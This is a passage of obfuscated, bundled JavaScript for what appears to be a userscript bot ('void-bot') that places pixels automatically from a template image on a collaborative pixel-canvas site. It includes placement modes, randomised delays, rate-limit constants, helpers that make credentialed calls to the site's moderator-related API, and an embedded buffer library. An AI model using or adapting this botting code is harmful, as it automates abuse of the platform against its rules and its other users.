F8=F0;if(this[F8(0x248)]===null||this[F8(0x27f)]===null||this[F8(0x289)]===null||this['height']===null)i7[F8(0x2ca)](F8(0x21d));this[F8(0x1dd)]=this[F8(0x2c1)](this[F8(0x248)],this['yStart'],this[F8(0x289)],this[F8(0x2e2)]);},'xStart':null,'yStart':null,'width':null,'height':null,'xEnd':null,'yEnd':null,'data':[],'pixelsToSet':[],'targets':[],'lastPxl':[null,null],'dist':(i8,i9,ii,is)=>(i8-ii)**0x2+(i9-is)**0x2},this[F0(0x372)]=()=>{var F9=F0;return R['canPlace']()?E(h*0.1,h*0.2):R[F9(0x2a5)]()*E(0xfa,0x258);},this[F0(0x2b9)]=function(){var Fi=F0;if(!R[Fi(0x293)]())return this[Fi(0x2ca)](Fi(0x2dd)),this[Fi(0x20e)]();;let i8=performance[Fi(0x26a)](),i9=null,ii=[];if(D){this[Fi(0x2f5)][Fi(0x248)]=D['x1'],this[Fi(0x2f5)][Fi(0x27f)]=D['y1'],this['zone'][Fi(0x289)]=D[Fi(0x289)],this['zone'][Fi(0x2e2)]=D[Fi(0x2e2)],this[Fi(0x2f5)][Fi(0x214)]=this[Fi(0x2f5)]['xStart']+this[Fi(0x2f5)][Fi(0x289)],this[Fi(0x2f5)][Fi(0x384)]=this[Fi(0x2f5)][Fi(0x27f)]+this[Fi(0x2f5)]['height'],this['zone']['override']();if(this[Fi(0x382)])return J[Fi(0x31b)](Fi(0x2d5)),this[Fi(0x20e)](0x1f4);;}else return this[Fi(0x2ca)]('no\x20tmp'),J['setBotStatus'](Fi(0x325)),this[Fi(0x20e)](0x1f4);;let is=this[Fi(0x1d4)]();switch(is){case Fi(0x20c):this[Fi(0x205)]++,J[Fi(0x31b)](Fi(0x20c)),this['restart']();break;case Fi(0x2a7):this[Fi(0x2ca)](Fi(0x246)),J[Fi(0x31b)](Fi(0x2a7)),this[Fi(0x20e)](E(0x2*0x3e8,0x4*0x3e8),t);break;default:J[Fi(0x31b)](Fi(0x358)),this[Fi(0x20e)](E(0x2*0x3e8,0x4*0x3e8),t);};},this['botting']=function(){var Fs=F0;let i8;if(this[Fs(0x35b)]()===Fs(0x37f))i8=()=>!![];else{if(this[Fs(0x35b)]()===Fs(0x1fd)){let ii=document[Fs(0x33f)](Fs(0x220))['style'][Fs(0x394)][Fs(0x24d)](f)[Fs(0x1ea)](is=>+is);i8=is=>Q['same'](is,ii);}};const i9=is=>{var FF=Fs;let iF,ig,iv=0x0;for(ig=0x0;ig!==this['zone'][FF(0x2e2)];ig++)for(iF=0x0;iF!==this[FF(0x2f5)][FF(0x289)];iF++,iv+=0x4)is(iF,ig,iv);};if(this['getMode']()===Fs(0x213)){let is=[],iF;i9((ig,iv,iz)=>{var Fg=Fs;iF=q(iz);if(iF!==null&&iF[0x3]!==0x0&&i8(iF)&&!Q[Fg(0x347)](this[Fg(0x2f5)][Fg(0x255)](iz),iF))is[Fg(0x32c)]([ig,iv,Q[Fg(0x299)](iF)]);}),J[Fs(0x375)](Math[Fs(0x398)]((is[Fs(0x2b0)]<<0x2)/0x6)/0xa,Math[Fs(0x398)](is[Fs(0x2b0)]*0x7/0x6)/0xa);if(is[Fs(0x2b0)])return xy=is[E(0x0,is[Fs(0x2b0)]-0x1)],xy[0x0]+=D['x1'],xy[0x1]+=D['y1'],o[Fs(0x262)](...xy),Fs(0x20c);else return Fs(0x2a7);}else{if(this['getMode']()===Fs(0x37d)){let ig,iv,iz=0x0,iS,iB=null,iM=0x0;i9((iK,iC,ik)=>{var Fv=Fs;iS=q(ik);iS!==null&&iS[0x3]!==0x0&&i8(iS)&&!Q['same'](this[Fv(0x2f5)][Fv(0x255)](ik),iS)&&(iM++,iB===null&&(iB=[iK+D['x1'],iC+D['y1'],Q[Fv(0x299)](iS)]));;}),J[Fs(0x375)](Math['round']((iM<<0x2)/0x6)/0xa,Math[Fs(0x398)](iM*0x7/0x6)/0xa);if(iB)return o['setPixel'](...iB),Fs(0x20c);else return Fs(0x2a7);}else{if(this['getMode']()===Fs(0x273)){let iK=[],iC=D[Fs(0x289)]/0x2,ik=D[Fs(0x2e2)]/0x2;const ih=([iT,ij])=>((iT-iC)**0x2+(ij-ik)**0x2)**0.5;let it,ip,iy=Infinity,iX=0x0;i9((iT,ij,ib)=>{var Fz=Fs;it=q(ib);if(it!==null&&it[0x3]!==0x0&&i8(it)&&!Q[Fz(0x347)](this[Fz(0x2f5)][Fz(0x255)](ib),it)){iX++,ip=ih([iT,ij]);if(iy>ip+0.9)iy=ip,iK=[[iT,ij,Q['RGBToId'](it)]];else iy===ip&&iK[Fz(0x32c)]([iT,ij,Q[Fz(0x299)](it)]);;};}),J[Fs(0x375)](Math['round']((iX<<0x2)/0x6)/0xa,Math[Fs(0x398)](iX*0x7/0x6)/0xa);if(iK['length'])return xy=iK[E(0x0,iK['length']-0x1)],xy[0x0]+=D['x1'],xy[0x1]+=D['y1'],o['setPixel'](...xy),Fs(0x20c);else return Fs(0x2a7);}else{if(this['getMode']()===Fs(0x327)){let iT,ij,ib,iZ,iE=!![],iU=0x0,iV=null;for(iZ=0x0;iZ!==0x2;iZ++){iE=iZ===0x0;for(ij=0x0;ij!==this[Fs(0x2f5)][Fs(0x2e2)];ij++){iE=!iE;for(iT=+iE;iT<this[Fs(0x2f5)][Fs(0x289)];iT+=0x2){ib=getPxlInTemplate(iT,ij);ib!==null&&ib[0x3]!==0x0&&i8(ib)&&!Q['same'](ib,this[Fs(0x2f5)][Fs(0x2de)](iT,ij))&&(iU++,iV===null&&(iV=[iT+D['x1'],ij+D['y1'],Q[Fs(0x299)](ib)]));;};};};J[Fs(0x375)](Math['round']((iU<<0x2)/0x6)/0xa,Math['round'](iU*0x7/0x6)/0xa);if(iV)return o[Fs(0x262)](...iV),Fs(0x20c);else return Fs(0x2a7);}else{if(this[Fs(0x210)]()===Fs(0x2fb)){let id=this[Fs(0x33b)][Fs(0x354)]()[Fs(0x1eb)](([ir,ic,iu])=>!Q[Fs(0x347)](this[Fs(0x2f5)][Fs(0x2de)](ir,ic),iu));if(id['length']){const ir=id[Fs(0x30f)]();return o['setPixel'](ir[0x0]+D['x1'],ir[0x1]+D['y1'],Q[Fs(0x299)](ir[0x2])),Fs(0x20c);}else return'done';}else this['log'](Fs(0x203));}}}}},this['timeout']=null,this[F0(0x230)]=function(){var FS=F0;this['timeout']!==null&&(clearTimeout(this['timeout']),this[FS(0x26d)]=null);},this[F0(0x38d)]=function(){var FB=F0;this[FB(0x230)](),this[FB(0x2ca)](FB(0x30d)),J['setBotStatus'](FB(0x244));},this['restart']=function(i8=this[F0(0x372)]()){var FM=F0;this[FM(0x230)](),this['timeout']=setTimeout(()=>this['cycle'](),i8),this[FM(0x2ca)]('R\x20'+i8);};}();J[sF(0x37a)][sF(0x1d3)](sF(0x3a2),i7=>i2[sF(0x39e)](localStorage[sF(0x24b)]=i7['target'][sF(0x2f7)])),i2[sF(0x2c2)][sF(0x22f)](i7=>J['addMode'](i7)),J['strategyElement'][sF(0x29f)][sF(0x22f)](i7=>i7[sF(0x2f7)]===i2[sF(0x340)]&&i7[sF(0x2f0)]('selected','')),J['coverElement']['addEventListener']('change',i7=>i2[sF(0x337)](localStorage[sF(0x2f4)]=i7[sF(0x1d1)][sF(0x2f7)])),i2[sF(0x32a)][sF(0x22f)](i7=>J[sF(0x36d)](i7)),J[sF(0x227)][sF(0x29f)][sF(0x22f)](i7=>i7['value']===i2[sF(0x38a)]&&i7[sF(0x2f0)]('selected','')),window[sF(0x1d3)](sF(0x1fc),({keyCode:i7})=>{var FK=sF;switch(i7){case 0x42:i2[FK(0x26d)]===null?i2[FK(0x20e)](0x0):i2[FK(0x38d)]();break;case 0x4e:let [i8,i9]=i5();J[FK(0x310)][FK(0x2f7)]=localStorage['lastX']=i8,J['yInput'][FK(0x2f7)]=localStorage['lastY']=i9;D&&(D['x1']=i8,D['y1']=i9);break;default:console[FK(0x2ca)](i7);};});function i3(){var FC=sF;let i7,i8,i9,ii,is=i4();return i7=~~(I[FC(0x32b)]-I['clientX']/ is+0x1),i8=~~(I['worldY']-I[FC(0x346)]/ is+0x1),i9=~~(I[FC(0x32b)]+(n[FC(0x289)]-I[FC(0x21c)])/ is-0x1),ii=~~(I['worldY']+(n[FC(0x2e2)]-I[FC(0x346)])/ is-0x1),[i7,i8,i9,ii];}function i4(){var Fk=sF;let i7=+window['location'][Fk(0x242)][Fk(0x24d)](f)[0x2];return i7>0xa?(i7/0xa)**0x2:i7**0.1||0x1;}function i5(){var Fh=sF;return N['innerText'][Fh(0x24d)](f)[Fh(0x1ea)](i7=>+i7);}}[Ft(0x300)](this,i(Ft(0x258))['Buffer']));},{'./resources/canvas':0x2,'./resources/constants':0x3,'./resources/selectors.json':0x4,'./resources/style':0x5,'./utils/Chunk':0x6,'./utils/ImageProcessor':0x7,'./utils/Palette':0x8,'./utils/Template':0x9,'./utils/functions':0xa,'buffer':0xc}],0x2:[function(i,s,F){var Fp=z;s[Fp(0x316)]={'CHUNK_SIZE':0x100,'COLORS':[[0xca,0xe3,0xff],[0xff,0xff,0xff],[0xff,0xff,0xff],[0xe4,0xe4,0xe4],[0xc4,0xc4,0xc4],[0x88,0x88,0x88],[0x4e,0x4e,0x4e],[0x0,0x0,0x0],[0xf4,0xb3,0xae],[0xff,0xa7,0xd1],[0xff,0x54,0xb2],[0xff,0x65,0x65],[0xe5,0x0,0x0],[0x9a,0x0,0x0],[0xfe,0xa4,0x60],[0xe5,0x95,0x0],[0xa0,0x6a,0x42],[0x60,0x40,0x28],[0xf5,0xdf,0xb0],[0xff,0xf8,0x89],[0xe5,0xd9,0x0],[0x94,0xe0,0x44],[0x2,0xbe,0x1],[0x68,0x83,0x38],[0x0,0x65,0x13],[0xca,0xe3,0xff],[0x0,0xd3,0xdd],[0x0,0x83,0xc7],[0x0,0x0,0xea],[0x19,0x19,0x73],[0xcf,0x6e,0xe4],[0x82,0x0,0x80]]};},{}],0x3:[function(i,s,F){var Fy=z;s[Fy(0x316)]={'MAX_REQUESTS_PER_HOUR':0xfa0,'PXL_CB':0x2*0x3e8,'MAX_TIME_STACK':0x3c*0x3e8};},{}],0x4:[function(i,s,F){var FX=z;s['exports']={'selectedColor':FX(0x220),'coords':FX(0x267),'palettebox':'#palettebox','gameCanvas':FX(0x2c6)};},{}],0x5:[function(i,s,F){var FT=z;s[FT(0x316)]='\x0a\x20\x20\x20\x20#void-bot\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20black;\x20color:\x20red;\x20padding:\x203px;\x20position:\x20absolute;\x20top:\x202%;\x20right:\x202%;\x20width:\x2040%;\x20font-weight:\x20bold;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20#void-bot\x20input{\x0a\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20black;\x20color:\x20red;\x20border-color:\x20darkred;\x20width:\x2060px;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20#void-bot\x20select{\x0a\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20black;\x20color:\x20red;\x20border-color:\x20darkred;\x20font:\x20inherit;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20#void-bot\x20button{\x0a\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20black;\x20color:\x20red;\x20border-color:\x20darkred;\x20font:\x20inherit;\x20margin:\x205px;\x0a\x20\x20\x20\x20}\x0a\x20\x20\x20\x20#void-bot\x20.half{\x0a\x20\x20\x20\x20\x20\x20\x20\x20width:\x20calc(50%\x20-\x205px);\x20margin-left:5px;\x0a\x20\x20\x20\x20}\x0a';},{}],0x6:[function(i,s,F){var Fj=z;const {CHUNK_SIZE:g}=i(Fj(0x319));s[Fj(0x316)]=class{constructor(S,B,M){var Fb=Fj;this['x']=S,this['y']=B,this['data']=M,this[Fb(0x208)]=Date[Fb(0x26a)](),this['_c']=null;}[Fj(0x2de)](S,B){var FZ=Fj;return this['_c']=S+B*g<<0x2,[this[FZ(0x1dd)][this['_c']],this[FZ(0x1dd)][this['_c']+0x1],this[FZ(0x1dd)][this['_c']+0x2]];}['set'](S,B,M){var FE=Fj;return this['_c']=S+B*g<<0x2,[this[FE(0x1dd)][this['_c']],this['data'][this['_c']+0x1],this['data'][this['_c']+0x2]]=[...M];}};},{'../resources/canvas.json':0x2}],0x7:[function(i,s,F){var FU=z;const g=i(FU(0x266)),{floor:S,sqrt:B,min:M}=Math,K=C=>{var FV=FU;let k=new Uint8ClampedArray(C[FV(0x2b0)]);for(let h=0x0;h!==C[FV(0x2b0)];h++)k[h]=C[h];return k;};s[FU(0x316)]=class C{constructor(){var Fd=FU;this[Fd(0x2a4)]=null,this[Fd(0x261)]=null,this['targets']=null,this['currentMode']=null,this[Fd(0x265)]={'LINEAR':0x0,'RANDOM':0x1,'WOYKEN':0x2};}[FU(0x355)](k){var Fr=FU,h=k['length'],t,p;while(0x0!==h){p=Math[Fr(0x271)](Math[Fr(0x213)]()*h),h-=0x1,t=k[h],k[h]=k[p],k[p]=t;}return k;}[FU(0x387)](k){var Fc=FU;this[Fc(0x261)]=k,this[Fc(0x2a4)]={'width':k[Fc(0x289)],'height':k['height'],'data':K(k['data'])},this['sobelData']=g(this[Fc(0x261)][Fc(0x328)][Fc(0x245)](0x0,0x0,this[Fc(0x2a4)][Fc(0x289)],this[Fc(0x2a4)][Fc(0x2e2)]))[Fc(0x26e)]()[Fc(0x1dd)],this[Fc(0x239)]=null;}[FU(0x269)](k,h){var Fu=FU;const t=[];let p,X,T,j,Z,E;for(let U=0x0;U!==this[Fu(0x2a4)][Fu(0x2e2)];U++){X=this[Fu(0x2a4)][Fu(0x289)]*U;for(let V=0x0;V!==this['template'][Fu(0x289)];V++){p=X+V<<0x2,T=this[Fu(0x2ab)][p],j=this[Fu(0x2ab)][p|0x1],Z=this[Fu(0x2ab)][p|0x2],E=this[Fu(0x2a4)][Fu(0x1dd)][p|0x3];if(E!==0xff)continue;j>=k&&j<=h&&t[Fu(0x32c)]({'x':V,'y':U});}}return t;}['_createTargets'](k){var FA=FU;const h=S(this[FA(0x2a4)][FA(0x289)]/0x2),t=S(this[FA(0x2a4)][FA(0x2e2)]/0x2),p=0x14;let X,T;const j=U=>(U['x']-h)**0x2+(U['y']-t)**0x2,b=U=>{var FO=FA;let V=[],d=[];for(let r=0x0;r!==U[FO(0x2b0)];r++){(U[r]['x']+U[r]['y'])%p===0x0||Math[FO(0x23b)](U[r]['x']-U[r]['y'])%p===0x0?d[FO(0x32c)](U[r]):V[FO(0x32c)](U[r]);}return{'grid':d,'other':V};},Z=U=>{var FY=FA;U=[...U];let V=[];const d=()=>{var FQ=z;let r=0x0,c=j(U[0x0]),u,A;for(let O=0x0;O!==U[FQ(0x2b0)];O++){u=j(U[O]);if(u<c){c=u,r=O;if(u===0x0)break;}}return U[FQ(0x378)](r,0x1)[0x0];};while(U[FY(0x2b0)])V[FY(0x32c)](d());return V;};this['layers']=[];for(let U=0x0;U!==0x100;U++){let {grid:V,other:d}=b(this[FA(0x269)](U,U));V=Z(V),d=Z(d),this['layers'][U]=[],d['forEach'](r=>this[FA(0x1dc)][U][FA(0x32c)](r)),V[FA(0x22f)](r=>this[FA(0x1dc)][U][FA(0x32c)](r));}this[FA(0x239)]=[],this['layers'][FA(0x22f)](r=>r[FA(0x22f)](c=>this[FA(0x239)]['push'](c)));let E;this[FA(0x239)]=this[FA(0x239)]['map'](({x:r,y:c})=>{var FP=FA;return E=r+c*this[FP(0x2a4)][FP(0x289)]<<0x2,[r,c,[this['template'][FP(0x1dd)][E],this['template'][FP(0x1dd)][E|0x1],this[FP(0x2a4)]['data'][E|0x2]]];});}[FU(0x39e)](k){this['currentMode']=k;}[FU(0x354)](){var Fw=FU;if(!this[Fw(0x239)])this[Fw(0x380)]();return this['targets'];}};},{'sobel':0xe}],0x8:[function(i,s,F){var FW=z;s['exports']=class{constructor(){var FG=z;this[FG(0x35a)]=null,this[FG(0x3b0)]=null;}[FW(0x23f)](g){var Fl=FW;this['colors']=g[Fl(0x1ea)](S=>[...S]);}['same'](g,S,B=0xf){var Fe=FW;return Math[Fe(0x23b)](g[0x0]-S[0x0])<B&&Math[Fe(0x23b)](g[0x1]-S[0x1])<B&&Math['abs'](g[0x2]-S[0x2])<B;}[FW(0x253)](g){var Fm=FW;return this[Fm(0x299)](g)!==null;}['convert'](g){var Fo=FW;let S,B=Infinity,M,K;for(let C=0x2;C!==this[Fo(0x3b0)][Fo(0x2b0)];C++){K=this[Fo(0x3b0)][C];if(this[Fo(0x347)](K,g))return K;;M=Math[Fo(0x23b)](K[0x0]-g[0x0])+Math[Fo(0x23b)](K[0x1]-g[0x1])+Math[Fo(0x23b)](K[0x2]-g[0x2]);M<B&&(B=M,S=C);;};return[...this[Fo(0x3b0)][S]];}[FW(0x2b5)](g){var FL=FW;return this[FL(0x3b0)][g];}['RGBToId'](g){var FJ=FW;for(let S=this[FJ(0x3b0)][FJ(0x2b0)]-0x1;S!==-0x1;S--)if(this[FJ(0x347)](this[FJ(0x3b0)][S],g))return S;return null;}[FW(0x20f)](g){var FH=FW;this[FH(0x35a)][typeof g===FH(0x24c)?this[FH(0x299)](g):g][FH(0x320)]();}['onColorSelect'](){}[FW(0x22d)](g){var FN=FW;g=Array[FN(0x2b7)](g),this[FN(0x35a)]={},this[FN(0x3b0)][FN(0x22f)]((S,B)=>{var Fn=FN;let M=g['find'](K=>this[Fn(0x347)](S,K['style'][Fn(0x394)][Fn(0x24d)](/-?\d+/g)[Fn(0x1ea)](C=>+C)));if(M===void 0x0)return console['error']('Can\x27t\x20find\x20element\x20for\x20color\x20['+S+']');this['elems'][B]=M,this[Fn(0x35a)][B][Fn(0x1d3)](Fn(0x320),()=>this[Fn(0x2b6)]({'id':B,'rgb':S}));});}};},{}],0x9:[function(i,s,F){var FI=z;const {loadImage:g}=i(FI(0x219));class S{constructor({x:B,y:M,width:K,height:C,name:k,src:h}){var Ff=FI;this['x1']=B,this['y1']=M,this[Ff(0x289)]=K,this[Ff(0x2e2)]=C,this[Ff(0x1f5)](),this['name']=k,this['src']=h,this[Ff(0x291)]=S[Ff(0x39b)],this[Ff(0x31a)]=null,this[Ff(0x24f)]=null;}[FI(0x390)](B,M,K,C){return this['x1']<K&&this['x2']>B&&this['y1']<C&&this['y2']>M;}[FI(0x1f5)](){var Fa=FI;this['x2']=this['x1']+this[Fa(0x289)],this['y2']=this['y1']+this['height'];}[FI(0x2ac)](){var Fx=FI;return this[Fx(0x291)]=S[Fx(0x200)],new Promise((B,M)=>{var FR=Fx;if(this[FR(0x22c)]===null)return console[FR(0x3a1)](FR(0x1cf)),M();;g(this[FR(0x22c)])[FR(0x276)](K=>{var FD=FR;this[FD(0x31a)]=K,this[FD(0x24f)]=document[FD(0x395)](FD(0x24f)),this['width']=this[FD(0x24f)][FD(0x289)]=this[FD(0x31a)]['width'],this[FD(0x2e2)]=this['canvas'][FD(0x2e2)]=this[FD(0x31a)]['height'],this[FD(0x1f5)](),this[FD(0x328)]=this[FD(0x24f)]['getContext']('2d'),this['ctx'][FD(0x2c4)](this[FD(0x31a)],0x0,0x0),this[FD(0x386)]=this[FD(0x328)][FD(0x245)](0x0,0x0,this['width'],this['height']),this[FD(0x1dd)]=this[FD(0x386)][FD(0x1dd)],this['status']=S['LOADED'],B(this);})[FR(0x247)](K=>M(K));});}[FI(0x31f)](B){var Fq=FI;let M;for(M=0x0;M!==this[Fq(0x1dd)][Fq(0x2b0)];M+=0x4){if(this[Fq(0x1dd)][M+0x3]===0x0)continue;[this['data'][M],this[Fq(0x1dd)][M+0x1],this[Fq(0x1dd)][M+0x2]]=B['convert']([this[Fq(0x1dd)][M],this[Fq(0x1dd)][M+0x1],this['data'][M+0x2]]);};this[Fq(0x328)][Fq(0x318)](this[Fq(0x386)],0x0,0x0);}};S['UNLOADED']=0x0,S['LOADING']=0x1,S[FI(0x25e)]=0x2,s[FI(0x316)]=S;},{'./functions':0xa}],0xa:[function(i,s,F){var gk=z;function g(O,Q,Y){return Q>O&&Q<Y;};function S(O,Q){var g0=z;O[g0(0x3aa)]=O[g0(0x1e5)]=O['msImageSmoothingEnabled']=O[g0(0x27b)]=Q;};function B(O,Q){var g1=z;Object[g1(0x392)](O)[g1(0x22f)](Y=>Q(O[Y],Y));};function M(O){var g2=z;document[g2(0x29a)][g2(0x307)](C({'type':g2(0x32e),'html':O}));};function K(O,Q){var g3=z;if(!('Notification'in window))return;const Y=()=>new Notification(O,Q);if(Notification[g3(0x2a0)]===g3(0x228))Y();else Notification[g3(0x2a0)]!==g3(0x3af)&&Notification['requestPermission'](P=>{var g4=g3;if(P===g4(0x228))Y();});;};function C(O,Q=[]){var g5=z;let Y=O[g5(0x25c)]===g5(0x326)?document['createTextNode'](O[g5(0x326)]||''):document[g5(0x395)](O[g5(0x25c)]);O['id']&&Y[g5(0x2f0)]('id',O['id']);O[g5(0x30c)]&&Y['setAttribute'](g5(0x30c),O[g5(0x30c)]);O[g5(0x32e)]&&Y[g5(0x2f0)]('style',O[g5(0x32e)]);if(O[g5(0x1d5)])Y[g5(0x272)]=O[g5(0x1d5)];else O[g5(0x326)]&&(Y[g5(0x2bc)]=O[g5(0x326)]);O[g5(0x373)]&&Object[g5(0x286)](O[g5(0x373)])[g5(0x22f)](([P,w])=>{var g6=g5;P[g6(0x224)]('on')?Y[g6(0x1d3)](P[g6(0x1f9)](0x2),w):Y[g6(0x1d3)](P,w);});O[g5(0x35c)]&&Object[g5(0x286)](O[g5(0x35c)])[g5(0x22f)](([P,w])=>Y[g5(0x2f0)](P,w));O['shadow']===!![]&&Y['attachShadow']({'mode':'open'});if(Q[g5(0x2b0)]!==0x0){const P=O['shadow']?Y[g5(0x383)]:Y;Q[g5(0x22f)](w=>P[g5(0x307)](w));}return Y;}function k(O){var g7=z;return O?'On':g7(0x251);};function h(O,Q=void 0x0){var g8=z;let Y=document['createElement']('a');Y['href']=O[g8(0x38c)](g8(0x215)),Y[g8(0x356)]=Q,Y[g8(0x320)]();};function t(O){var g9=z;return document[g9(0x345)](O);};function p(O){return new Promise((Q,Y)=>{var gi=z;let P=new Image();P['crossOrigin']='',P[gi(0x31c)]=()=>Q(P),P[gi(0x1e9)]=Y,P[gi(0x22c)]=O;});};function X(O){var gs=z;return C({'type':gs(0x37e)},[C({'type':gs(0x37e),'class':gs(0x34c),'html':'<img\x20style=\x22width:inherit;\x20height:inherit;\x22\x20src=\x22'+O+gs(0x312)})]);};function T(){var gF=z;let O=![];try{O=window!=window[gF(0x238)]||document!=top[gF(0x342)]||self[gF(0x3ae)]!=top['location'];}catch(Q){O=!![];};return O;};function j(O){var gg=z;return window[gg(0x3a6)]={'imports':{'imported_func':Q=>console[gg(0x2ca)](Q)}},fetch(O)['then'](Q=>Q[gg(0x22a)]())[gg(0x276)](Q=>WebAssembly[gg(0x2e8)](Q,window[gg(0x3a6)]));};function b(O,Q,Y){var gv=z;let P=document[gv(0x395)](gv(0x24f)),w=P[gv(0x2be)]('2d');P[gv(0x289)]=Q,P[gv(0x2e2)]=Y;let G=w[gv(0x245)](0x0,0x0,Q,Y);for(let W=0x0;W!==O[gv(0x2b0)];W++)G[gv(0x1dd)][W]=O[W];return w[gv(0x318)](G,0x0,0x0),P;};function Z(O,Q){var gz=z;return Math[gz(0x398)](O-0.5+Math[gz(0x213)]()*(Q-O+0x1));}function E(){var gS=z;return u(gS(0x35f));}async function U(O){var gB=z;const Q=new FormData();Q[gB(0x351)]('modlist',!![]);const Y=await fetch(c+gB(0x236),{'credentials':'include','method':gB(0x1fb),'body':Q});Y['ok']?O(await Y[gB(0x2ef)]()):O([]);}async function V(O,Q){var gM=z;const Y=new FormData();Y[gM(0x351)](gM(0x389),O);const P=await fetch(c+gM(0x236),{'credentials':gM(0x2aa),'method':gM(0x1fb),'body':Y});Q(P['ok'],await P['text']());}function d(){var gK=z;return u(gK(0x338));}const r=function O(){var gC=z;if(!window['ssv']||!window[gC(0x216)][gC(0x3a8)]||window[gC(0x3ae)]['host']===gC(0x30a))return'';const Q=window[gC(0x3ae)][gC(0x250)][gC(0x2c5)]('.');return Q[gC(0x2b0)]>0x2&&Q['shift'](),window[gC(0x216)]['shard']+'.'+Q[gC(0x209)]('.');}(),c=(r&&window['location'][gk(0x30e)]+'//'+r)+gk(0x297);async function u(Q,Y=!![],P=!![]){var gh=gk;P&&(Q=''+c+Q);try{const w=await A(Q,{'credentials':Y?gh(0x2aa):gh(0x256)});return w['json']();}catch(G){return{'errors':['Could\x20not\x20connect\x20to\x20server,\x20please\x20try\x20again\x20later\x20:(']};}}async function A(Q,Y={}){var gt=gk;const {timeout:timeout=0x7530}=Y,P=new AbortController(),w=setTimeout(()=>P[gt(0x229)](),timeout),G=await fetch(Q,{...Y,'signal':P[gt(0x343)]});return clearTimeout(w),G;}s[gk(0x316)]={'between':g,'antialiasing':S,'objForEach':B,'injectCSS':M,'trySendNotification':K,'factory':C,'switcherText':k,'downloadCanvas':h,'$':t,'loadImage':p,'createPanelButton':X,'isFrame':T,'loadWASM':j,'createCanvasFromData':b,'rand':Z,'fetchApiMe':E,'getModList':U,'submitRemMod':V,'banMe':d};},{}],0xb:[function(s,F,g){'use strict';var gp=z;g[gp(0x24a)]=t,g[gp(0x279)]=X,g[gp(0x36f)]=b;var S=[],B=[],M=typeof Uint8Array!==gp(0x2db)?Uint8Array:Array,K='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';for(var C=0x0,k=K[gp(0x2b0)];C<k;++C){S[C]=K[C],B[K['charCodeAt'](C)]=C;}B['-'['charCodeAt'](0x0)]=0x3e,B['_'['charCodeAt'](0x0)]=0x3f;function h(Z){var gy=gp,E=Z[gy(0x2b0)];if(E%0x4>0x0)throw new Error(gy(0x36b));var U=Z[gy(0x302)]('=');if(U===-0x1)U=E;var V=U===E?0x0:0x4-U%0x4;return[U,V];}function t(Z){var E=h(Z),U=E[0x0],V=E[0x1];return(U+V)*0x3/0x4-V;}function p(Z,E,U){return(E+U)*0x3/0x4-U;}function X(Z){var gX=gp,E,U=h(Z),V=U[0x0],d=U[0x1],r=new M(p(Z,V,d)),c=0x0,u=d>0x0?V-0x4:V,A;for(A=0x0;A<u;A+=0x4){E=B[Z[gX(0x368)](A)]<<0x12|B[Z[gX(0x368)](A+0x1)]<<0xc|B[Z[gX(0x368)](A+0x2)]<<0x6|B[Z['charCodeAt'](A+0x3)],r[c++]=E>>0x10&0xff,r[c++]=E>>0x8&0xff,r[c++]=E&0xff;}return d===0x2&&(E=B[Z[gX(0x368)](A)]<<0x2|B[Z[gX(0x368)](A+0x1)]>>0x4,r[c++]=E&0xff),d===0x1&&(E=B[Z[gX(0x368)](A)]<<0xa|B[Z['charCodeAt'](A+0x1)]<<0x4|B[Z[gX(0x368)](A+0x2)]>>0x2,r[c++]=E>>0x8&0xff,r[c++]=E&0xff),r;}function T(Z){return S[Z>>0x12&0x3f]+S[Z>>0xc&0x3f]+S[Z>>0x6&0x3f]+S[Z&0x3f];}function j(Z,E,U){var gT=gp,V,d=[];for(var r=E;r<U;r+=0x3){V=(Z[r]<<0x10&0xff0000)+(Z[r+0x1]<<0x8&0xff00)+(Z[r+0x2]&0xff),d[gT(0x32c)](T(V));}return d[gT(0x209)]('');}function b(Z){var gj=gp,E,U=Z[gj(0x2b0)],V=U%0x3,d=[],r=0x3fff;for(var c=0x0,u=U-V;c<u;c+=r){d['push'](j(Z,c,c+r>u?u:c+r));}if(V===0x1)E=Z[U-0x1],d[gj(0x32c)](S[E>>0x2]+S[E<<0x4&0x3f]+'==');else V===0x2&&(E=(Z[U-0x2]<<0x8)+Z[U-0x1],d[gj(0x32c)](S[E>>0xa]+S[E>>0x4&0x3f]+S[E<<0x2&0x3f]+'='));return d['join']('');}},{}],0xc:[function(i,s,F){var vW=z;(function(g){/*!
 * The buffer module from node.js, for the browser.
 *
 * @author   Feross Aboukhadijeh <https://feross.org>
 * @license  MIT
 */
'use strict';var gb=z;var S=i(gb(0x2ea)),B=i('ieee754');F[gb(0x285)]=g,F['SlowBuffer']=E,F[gb(0x2e9)]=0x32;var M=0x7fffffff;F[gb(0x283)]=M,g['TYPED_ARRAY_SUPPORT']=K();!g['TYPED_ARRAY_SUPPORT']&&typeof console!=='undefined'&&typeof console['error']===gb(0x305)&&console[gb(0x3a1)](gb(0x2a6)+gb(0x260));function K(){var gZ=gb;try{var i5=new Uint8Array(0x1);return i5[gZ(0x34a)]={'__proto__':Uint8Array[gZ(0x1f3)],'foo':function(){return 0x2a;}},i5[gZ(0x2e7)]()===0x2a;}catch(i6){return![];}}Object[gb(0x36c)](g[gb(0x1f3)],'parent',{'enumerable':!![],'get':function(){var gE=gb;if(!g['isBuffer'](this))return undefined;return this[gE(0x258)];}}),Object[gb(0x36c)](g[gb(0x1f3)],'offset',{'enumerable':!![],'get':function(){var gU=gb;if(!g[gU(0x1f8)](this))return undefined;return this[gU(0x20b)];}});function C(i5){var gV=gb;if(i5>M)throw new RangeError(gV(0x1e0)+i5+gV(0x222));var i6=new Uint8Array(i5);return i6[gV(0x34a)]=g[gV(0x1f3)],i6;}function g(i5,i6,i7){var gd=gb;if(typeof i5===gd(0x275)){if(typeof i6===gd(0x2a2))throw new TypeError('The\x20\x22string\x22\x20argument\x20must\x20be\x20of\x20type\x20string.\x20Received\x20type\x20number');return p(i5);}return k(i5,i6,i7);}typeof Symbol!==gb(0x2db)&&Symbol[gb(0x2a1)]!=null&&g[Symbol[gb(0x2a1)]]===g&&Object[gb(0x36c)](g,Symbol[gb(0x2a1)],{'value':null,'configurable':!![],'enumerable':![],'writable':![]});g[gb(0x201)]=0x2000;function k(i5,i6,i7){var 